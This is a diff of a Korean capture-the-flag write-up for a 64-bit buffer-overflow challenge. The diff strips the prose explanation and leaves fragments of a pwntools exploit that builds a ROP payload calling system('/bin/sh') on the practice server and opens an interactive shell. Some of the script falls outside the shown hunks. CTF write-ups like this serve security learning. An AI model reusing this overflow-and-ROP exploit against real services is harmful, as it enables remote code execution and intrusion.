@@ -1,20 +1,3 @@
-# Yes or no
-
-64bit 환경에서의 BOF 문제이다.      
-<br/>
-
-![](1.PNG)    
-gets 함수 부분에서 BOF 취약점이 발생하며, 올바른 값을 입력해야만 get함수 부분으로 진행할 수 있다.   
-<br/>
-
-![](2.PNG)   
-![](3.PNG)   
-올바른 값을 찾기 위해 gdb로 cmp 하기 전에 break를 걸고, eax값을 확인해서 값을 알아낸다.   
-<br/>
-
-
-이후에는 평범한 64bit ROP를 이용하면 된다.   
-```
 from pwn import *
 
 p = remote('ctf.j0n9hyun.xyz', 3009)
@@ -58,6 +41,7 @@ system_addr = libc_addr + libc.symbols['system']
 binsh = libc_addr + 0x1b3e9a
 
 # exploit
+
 payload2 = ''
 payload2 += 'A'*0x12 + 'B'*8
 payload2 += p64(gadget)
@@ -73,4 +57,3 @@ p.sendline(payload2)
 
 sleep(0.2)
 p.interactive()
-```
